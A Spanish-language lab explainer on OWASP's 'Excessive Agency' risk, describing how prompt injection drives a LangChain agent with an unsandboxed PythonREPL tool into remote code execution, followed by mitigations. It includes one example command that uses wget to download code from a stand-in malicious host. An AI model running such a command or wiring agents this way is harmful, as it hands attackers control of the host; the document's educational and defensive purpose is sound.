# LLM08: Excessive Agency (Agencia Excesiva)

## Descripción Teórica
Formalmente documentada bajo el OWASP Top 10 for LLMs actual, **Excessive Agency** detalla las vulnerabilidades que surgen cuando a un LLM se le otorgan permisos, autonomía y capacidades sobre un sistema sin la granularidad o los controles de seguridad necesarios.

Esta falla ocurre por tres factores:
- **Excesiva Funcionalidad:** La herramienta conectada al LLM es muy amplia (e.g., acceso a todo el kernel en vez de a una sola API de lectura).
- **Excesivos Privilegios:** La aplicación corre con recursos root o administrador, de modo que lo que ejecuta el LLM impacta a nivel crítico.
- **Excesiva Autonomía:** El Agente decide invocar funciones de alto impacto sin un flujo de aprobación humano o validaciones intermedias.

## Vector en IA-Autonomous-RCE-Lab
La vulnerabilidad ocurre porque proveemos al agente de Langchain una herramienta de `PythonREPL` sin ningún tipo de contexto seguro. 
Si el modelo decide pasarle una cadena como `import os; os.system('wget http://malicioso.com/rm')`, el `PythonREPL` nativo (inseguro por defecto) evaluaría la orden localmente, permitiendo un Ejecución Remota de Código (RCE) completa en el host. El *Prompt Injection* inicial es solo el medio; la **Agencia Excesiva** es la falla arquitectónica subyacente que lo hace posible.

## Mitigaciones desde Ingeniería de Software

1. **Principio de Menor Privilegio (POLP):**
   Las herramientas entregadas al agente deben estar diseñadas para lograr solo una cosa. En lugar de darle "PythonREPL", diseñar APIs altamente específicas como `read_weather()` o `calculate_math()`.
2. **Sandboxing de ejecución en entornos no confiables:**
   Si entregar ejecución de código es el "Core Business" de la aplicación (como Jupyter IA, Code Interpreters), los motores de ejecución (Ej: eBPF, Docker Containers, nsjail) son imperiosos para confinar el ambiente efímero lejos del host principal.
3. **Output Parsing Validation:**
   Antes de que el *Action Input* vaya a la Herramienta, utilizar validadores fuertes como Pydantic *(Output Parsers)* que verifiquen el esquema, regexes para interceptar palabras prohibidas (import, os, subprocess) y aplicar una "confianza-cero" sobre lo que propuso el LLM.
4. **Human in the Loop (HITL):**
   Para acciones destructivas (borrar, transferir, modificar sistema), detener el agente y solicitar aprobación explícita de un operador mediante callbacks en Langchain.
